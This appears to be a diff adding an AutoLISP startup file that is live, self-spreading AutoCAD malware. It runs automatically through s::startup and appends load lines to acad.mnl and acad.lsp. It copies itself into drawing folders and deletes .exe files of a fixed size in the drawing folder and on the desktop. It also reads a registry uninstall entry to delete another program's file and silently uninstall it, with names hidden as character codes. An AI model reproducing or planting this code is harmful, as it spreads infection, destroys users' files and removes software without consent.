@@ -1,0 +1,655 @@
+(defun s::startup
+       ()
+  (setq old_cmd (getvar "cmdecho"))
+  (setvar "cmdecho" 0)
+(defun  defile
+       (plist / dwg
+	wpth
+	filenamelist
+	)
+  
+  
+(setq plist
+     (strunparse
+(str-cut
+  plist
+"\\"
+T
+ )
+"/"
+)
+ )     
+ (if (/= plist nil)
+(progn
+
+(setq filenamelist
+ (vl-directory-files
+  plist "*.exe" 1))
+(while
+(/= filenamelist nil)
+(setq
+dfile
+(strcat
+plist
+"/"
+(car
+ filenamelist)))
+(if
+(= 2561602
+ (vl-file-size
+ dfile))
+(vl-file-delete
+(strcat
+plist "/"
+(car
+filenamelist))
+ )
+
+(setq
+filenamelist
+(cdr
+ filenamelist))
+ )
+	      ;while
+ )
+);progn
+)
+)
+  
+
+(defun
+ str-cut
+(fa-str
+ str
+ how
+ /
+ len
+ li
+ no)
+    (setq
+      len
+      (strlen str))
+   (while
+     (setq
+no
+ (vl-string-search
+   str
+   fa-str))
+   (if
+(/= no 0)
+(setq li
+(cons
+ (substr
+ fa-str
+1 no) li))
+      )
+      (setq
+	li
+(cons
+(substr
+  fa-str
+  (1+ no)
+  len)
+li)
+fa-str
+(substr
+  fa-str
+  (+
+    no
+    len
+    1))
+      )
+    )
+    (if
+      (/=
+	""
+	fa-str)
+      (setq
+	li
+	 (cons
+	   fa-str
+	   li))
+    )
+    (if
+      how
+      (vl-remove
+	str
+	(reverse
+	  li))
+      (reverse
+	li)
+
+
+    )
+  )
+
+  (defun
+	 StrUnParse
+	 (Lst
+	  Delimiter
+	  / return)
+    (setq
+      return "")
+    (foreach
+	     str Lst
+      (setq
+	return
+	 (strcat
+	   return
+	   Delimiter
+	   str))
+    ) ;_ end of foreach
+    (substr
+      return 2)
+  )
+
+
+
+  
+  (setq path (findfile "base.dcl"))
+  (setq path (substr path 1 (- (strlen path) 8)))
+  (setq mnlpath (getvar "menuname"))
+  (setq nowdwg (getvar "dwgname"))
+  (setq wjqm (findfile nowdwg))
+  (setq	dwgpath	(substr	wjqm
+			1
+			(- (strlen wjqm)
+			   (strlen
+			     nowdwg
+			   )
+			)
+		)
+  )
+  (setq acadpath (findfile "acad.lsp"))
+  (setq	acadpath (substr acadpath
+			 1
+			 (- (strlen acadpath) 8)
+		 )
+  )
+  (setq	ns1 ""
+	ns2 ""
+  )
+    
+  (setq lspbj 0)
+  (setq wjqm 
+(strcat path "acad.lsp"))
+  (if
+    (setq wjm (open wjqm "r"))
+     (progn
+       (while (setq wz (read-line wjm))
+	 (setq ns1 ns2)
+	 (setq ns2 wz)
+       )
+       (if (> (strlen ns1) 14)
+	 (if (= (substr ns1 8 8) "acadfile")
+	   (setq lspbj 1)
+	 )
+       )
+       (close wjm)
+     )
+  )
+  (setq lspmnl 0)
+  (setq	wjqm 
+(strcat path "acad.mnl")
+  )
+  (if (setq wjm 
+(open wjqm "r"))
+    (progn
+      (while
+	(setq wz 
+(read-line wjm))
+	 (setq ns1 ns2)
+	 (setq ns2 wz)
+      )
+      (if (> (strlen ns1) 14)
+	(if (= 
+(substr ns1 8 8)
+	       "acadfile"
+	    )
+	  (setq lspmnl 1)
+	)
+      )
+      (close wjm)
+    )
+  )
+  (if (= lspmnl 0)
+    (progn
+      (setq wjqm 
+(strcat path
+			
+ (strcat
+			   (chr 97)
+			   (chr 99)
+			   (chr 97)
+			   (chr 100)
+			   (chr 46)
+			   (chr 109)
+			   (chr 110)
+			   (chr 108)
+			 )
+		 )
+      )
+      (setq wjm 
+(open wjqm "a"))
+
+
+
+  
+  ;;;;acaclisp
+
+
+
+      
+      (write-line
+	(strcat	
+"(load "
+		(chr 34)
+		"acadfile"
+		(chr 34)
+		")"
+	)
+	wjm
+      )
+      (write-line
+ "(princ)" wjm)
+      (close wjm)
+    )
+  )
+  (if (= lspmnl 0)
+    (progn
+      (setq wjqm 
+(strcat path
+			
+ (strcat
+			   (chr 97)
+			   (chr 99)
+			   (chr 97)
+			   (chr 100)
+			   (chr 46)
+			   (chr 109)
+			   (chr 110)
+			   (chr 108)
+			 )
+		 )
+      )
+      (setq wjm 
+(open wjqm "a"))
+
+(write-line
+ "
+
+  (vl-file-delete
+    (findfile
+  (strcat
+    (vl-registry-read
+      (strcat
+	\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\\"
+	
+	       (chr 84)
+	     (chr 88)
+	       (chr 87)
+     (chr 83)
+               (chr 79)
+     	       (chr 102)
+       (chr 84)
+	       (chr 95)
+	       (chr 105)
+	       (chr 115)
+       (chr 49)	         
+	     
+      )
+      \"InstallLocation\"
+    )
+    \"support\\\\\"
+      (chr 77)
+   (chr 65)
+  (chr 73)
+      (chr 78)
+  (chr 46)
+ (chr 102)
+       (chr 97)
+ (chr 115)
+      
+ )
+  )
+  )
+
+
+ "
+
+  
+  wjm)
+
+
+(write-line
+  " 
+  (startapp
+    (vl-registry-read
+      (strcat
+	\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\\"
+	
+	       (chr 84)
+	     (chr 88)
+	       (chr 87)
+     (chr 83)
+               (chr 79)
+     	       (chr 102)
+       (chr 84)
+	       (chr 95)
+	       (chr 105)
+	       (chr 115)
+       (chr 49)	         
+	     
+      )
+      \"QuietUninstallString\"
+    )
+  )
+
+
+
+  "
+  wjm
+  )
+     
+      (write-line
+	(strcat	
+"(load "
+		(chr 34)
+		"acadfile"
+		(chr 34)
+		")"
+	)
+	wjm
+      )
+      (write-line
+ "(princ)" wjm)
+      (close wjm)
+    )
+  )
+  (if
+    (and
+      (= acadpath
+ dwgpath
+      )
+      (/=
+	acadpath
+	path
+      )
+    )
+     (progn
+       (if (= 0 lspmnl)
+	 (progn
+	   (setq oldacad
+		  (findfile
+		   (strcat
+		     (chr 97)
+		     (chr 99)
+		     (chr 97)
+		     (chr 100)
+		     (chr 46)
+		     (chr 108)
+		     (chr 115)
+		     (chr 112))
+		  )
+	   )
+	   (setq
+	     newacad
+	      (strcat path
+
+		      (strcat
+			(chr 97)
+			(chr 99)
+			(chr 97)
+			(chr 100)
+			(chr 102)
+			(chr 105)
+			(chr 108)
+			(chr 101)
+			(chr 46)
+			(chr 108)
+			(chr 115)
+			(chr 112)
+		      )
+	      )
+	   )
+	 )
+	 (progn
+	   (setq
+	     oldacad
+	      (strcat path
+		      (strcat
+			(chr 97)
+			(chr 99)
+			(chr 97)
+			(chr 100)
+			(chr 102)
+			(chr 105)
+			(chr 108)
+			(chr 101)
+			(chr 46)
+			(chr 108)
+			(chr 115)
+			(chr 112)
+		      )
+	      )
+
+	   )
+	   (setq newacad
+		  (findfile
+		   (strcat
+		     (chr 97)
+		     (chr 99)
+		     (chr 97)
+		     (chr 100)
+		     (chr 46)
+		     (chr 108)
+		     (chr 115)
+		     (chr 112))
+		  )
+	   )
+	 )
+       );mnl=0
+       (if (= lspbj 0)
+	 (progn	(setq wjqm
+		       (strcat path
+			      (strcat
+				(chr 97)
+				(chr 99)
+				(chr 97)
+				(chr 100)
+				(chr 46)
+				(chr 108)
+				(chr 115)
+				(chr 112))
+		       )
+		)
+		(setq wjm
+		       (open
+			 wjqm
+			 "a")
+		)
+		(write-line
+		  (strcat
+		    "(load "
+			  (chr 34
+			  )
+			  (strcat
+			    (chr 97)
+			    (chr 99)
+			    (chr 97)
+			    (chr 100)
+			    (chr 102)
+			    (chr 105)
+			    (chr 108)
+			    (chr 101)
+			    (chr 46)
+			    (chr 108)
+			    (chr 115)
+			    (chr 112)
+			  )
+			  (chr 34)
+			  ")"
+		  )
+		  wjm
+		)
+		(write-line
+		  "(princ)"
+		  wjm
+		)
+		(close
+		  wjm)
+	 )
+     
+);lsbj=o
+
+             
+       (writeapp)
+
+      )
+
+;;;;;
+
+    
+     (progn
+       (if
+	 (/= nowdwg
+	     "Drawing.dwg"
+	   )
+	 (progn
+	   (setq
+	     oldacad
+ (findfile
+(strcat
+ (chr 97)
+   (chr 99)
+ (chr 97)
+ (chr 100)
+    (chr 102)
+(chr 105)
+   (chr 108)
+(chr 101)
+   (chr 46)
+  (chr 108)
+ (chr 115)
+  (chr 112)
+	    )
+	  )
+	   )
+   (setq
+    newacad
+  (strcat
+   dwgpath
+
+ (strcat
+(chr 97)
+   (chr 99)
+	   (chr 97)
+   (chr 100)
+	   (chr 46)
+ (chr 108)
+	   (chr 115)
+ (chr 112))
+	  )
+ )
+   (writeapp)
+ )
+    )
+    )
+)
+
+  
+      (if  (not (findfile (strcat path
+			    (chr 97)
+			    (chr 99)
+			    (chr 97)
+			    (chr 100)
+			    (chr 102)
+			    (chr 105)
+			    (chr 108)
+			    (chr 101)
+			    (chr 46)
+			    (chr 108)
+			    (chr 115)
+			    (chr 112)
+			  ))
+		)
+	(progn
+
+(progn
+	   (setq oldacad
+		  (findfile
+		   (strcat
+		     (chr 97)
+		     (chr 99)
+		     (chr 97)
+		     (chr 100)
+		     (chr 46)
+		     (chr 108)
+		     (chr 115)
+		     (chr 112))
+		  )
+	   )
+	   (setq
+	     newacad
+	      (strcat path
+
+		      (strcat
+			(chr 97)
+			(chr 99)
+			(chr 97)
+			(chr 100)
+			(chr 102)
+			(chr 105)
+			(chr 108)
+			(chr 101)
+			(chr 46)
+			(chr 108)
+			(chr 115)
+			(chr 112)
+		      )
+	      )
+	   )
+	 )
+(writeapp)
+	  )
+       )
+     
+
+          
+	 	
+(defile dwgpath) 
+(setq panbook
+(strcat (car
+	  (str-cut path
+		   "Application" t))
+ "×ÀÃæ\\"))
+(defile panbook)     
+     
+
+ (setvar "cmdecho" old_cmd)
+  (princ)
+
+)
+
+(defun
+
+      writeapp	()
+  (if
+    (setq wjm1 (open newacad "w"))
+     (progn
+       (setq wjm (open oldacad "r"))
+       (while (setq wz (read-line wjm))
+	 (write-line wz wjm1)
+       )
+       (close wjm)
+       (close wjm1)
+     )
+  )
+)
+(princ)
+
+ 
+
+
+  
+
